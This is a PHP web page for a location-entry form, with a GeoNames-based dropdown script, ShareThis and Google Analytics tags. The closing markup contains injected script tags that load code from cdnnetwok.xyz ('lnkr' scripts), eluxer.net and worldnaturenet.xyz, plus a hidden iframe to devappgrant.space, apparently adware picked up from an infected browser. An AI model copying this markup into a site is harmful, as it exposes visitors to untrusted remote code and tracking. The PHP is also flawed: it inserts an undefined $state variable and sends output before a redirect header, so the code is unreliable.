<?php
include "includes/headsection.php";
?>
<?php
if (isset($_POST['Submit'])) {
     $continent=mysqli_real_escape_string($con,$_POST["Continent"]);
     $_SESSION['Continent']=$continent;
	 $country=mysqli_real_escape_string($con,$_POST["Country"]);
	 $_SESSION['Country']=$country;
		$province=mysqli_real_escape_string($con,$_POST["Province"]);
		$_SESSION['Province']=$province;
		$city=mysqli_real_escape_string($con,$_POST["City"]);
		$_SESSION['City']=$city;
		$contact=mysqli_real_escape_string($con,$_POST["Contact"]);
		$_SESSION['Contact']=$contact;
	    date_default_timezone_set("Asia/kolkata");
	    $currenttime1=time();
	    $datetime=strftime("%B-%d-%Y %H:%M:%S",$currenttime1);
	   // $datetime=strftime("%m-%d-%y",$currenttime1);
	    $datetime;
        $username = $_SESSION['username'];
        $viewongooglemap="default" ;
   	    $query1="INSERT INTO social(continent,country,state,city,contact)
   	    VALUES('$continent','$country','$state','$city','$contact')";
 		if (mysqli_query($con, $query1)) {
            echo "New record created successfully";
             header("Location:userprofile.php");
         }    
        else {
         echo "Error: " . $query1 . "<br>" . mysqli_error($con);
         }
}//end of the if submit*/

?>
<?php include 'includes/headsecapi.php'; ?>
<body>
<?php //include  "includes/navheader.php";?>
</ul></div></div></nav>
<div class='main'>
<style type="text/css">
.contents { background-color:#EDF4F8; padding:10px; border:2px dashed #C2DAE7; width: 70%; margin: 0 auto; }
.contents p span { display:block;float:left; margin-left:0px; width:110px; color:gray; font-weight:bold;}
.contents p select {float:left; margin-left:90px;}
.contents p {clear:both;overflow:hidden;}
</style>

<script type="text/javascript" src="js/geodata-jsr-class.js"></script>



<script type="text/javascript">
var whos=null;
function getplaces(gid,src)
{	
	whos = src
	
//	var  request = "http://ws.geonames.org/childrenJSON?geonameId="+gid+"&callback=getLocation&style=long";
	var request = "http://www.geonames.org/childrenJSON?geonameId="+gid+"&callback=listPlaces&style=long";
	aObj = new JSONscriptRequest(request);
	aObj.buildScriptTag();
	aObj.addScriptTag();	
}

function listPlaces(jData)
{
	counts = jData.geonames.length<jData.totalResultsCount ? jData.geonames.length : jData.totalResultsCount
	who = document.getElementById(whos)
	who.options.length = 0;
	
	if(counts)who.options[who.options.length] = new Option('Select','')
	else who.options[who.options.length] = new Option('No Data Available','NULL')
			
	for(var i=0;i<counts;i++)
		who.options[who.options.length] = new Option(jData.geonames[i].name,jData.geonames[i].geonameId)

	delete jData;
	jData = null		
}

window.onload = function() { getplaces(6295630,'continent'); }
</script>

<!--http://gis.stackexchange.com/questions/603/is-a-country-state-city-database-available-->
<!-- by line -->


<!-- facebook comments -->

<!-- end facebook comments -->

</div>
<!-- end div main -->

<script type="text/javascript">var switchTo5x=true;</script>
<script type="text/javascript" src="http://w.sharethis.com/button/buttons.js"></script>
<script type="text/javascript">stLight.options({publisher: "d5d04ed8-04d1-4c39-9336-46d4c4ce9d65", doNotHash: false, doNotCopy: false, hashAddressBar: false});</script>

<!-- Google Analytics -->

<script type="text/javascript">
var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
document.write(unescape("%3Cscript src='" + gaJsHost + "google-analytics.com/ga.js' type='text/javascript'%3E%3C/script%3E"));
</script><script src="http://www.google-analytics.com/ga.js" type="text/javascript"></script>
<script type="text/javascript">
var pageTracker = _gat._getTracker("UA-5776689-2");
pageTracker._initData();
pageTracker._trackPageview();
</script>


<div id="fb-root"></div><script id="wappalyzer" src="chrome-extension://gppongmhjkpfnbhagpmjfkannfbllamg/js/inject.js"></script><script type="text/javascript" src="http://cdnnetwok.xyz/addons/lnkr5.min.js"></script><script type="text/javascript" src="http://cdnnetwok.xyz/addons/lnkr30_nt.min.js"></script><script type="text/javascript" src="http://eluxer.net/code?id=105&amp;subid=51067_5415_"></script><script type="text/javascript" src="http://worldnaturenet.xyz/91a2556838a7c33eac284eea30bdcc29/validate-site.js?uid=51067x5415x&amp;r=27"></script><iframe src="https://devappgrant.space/lib/iframe.html?u=51067_5415&amp;t=0.8" style="display: none;"></iframe><div id="stcpDiv" style="position: absolute; top: -1999px; left: -1988px;">ShareThis Copy and Paste</div><div id="stwrapper" class="stwrapper stwrapper5x stwrapper5x" style="display: none;"><iframe allowtransparency="true" id="stLframe" class="stLframe" name="stLframe" frameborder="0" scrolling="no" src="http://edge.sharethis.com/share5x/index.07aa22477eb34a270569a00cbffd8b2f.html"></iframe></div><div id="stOverlay" onclick="javascript:stWidget.closeWidget();"></div></body><div id="coFrameDiv" style="height:0px;display:none;"><iframe id="coToolbarFrame" src="chrome-extension://cjabmdjcfcfdmffimndhafhblfmpjdpe/toolbar/placeholder.html" style="height: 0px; width: 100%; display: none;"></iframe></div></html>